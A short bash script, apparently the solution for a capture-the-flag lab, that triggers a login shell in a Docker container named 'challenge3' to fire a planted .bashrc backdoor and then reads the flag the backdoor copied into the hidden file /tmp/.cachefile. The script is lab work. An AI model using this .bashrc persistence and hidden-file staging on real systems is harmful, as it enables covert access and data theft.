#!/bin/bash
set -euo pipefail
cd "$(dirname "$0")"

container=challenge3

echo "[*] Triggering login shell to execute the .bashrc backdoor..."
docker exec -u ctfuser "$container" bash -lc 'true'

echo "[*] Reading copied flag from /tmp/.cachefile..."
docker exec -u ctfuser "$container" bash -lc 'cat /tmp/.cachefile'
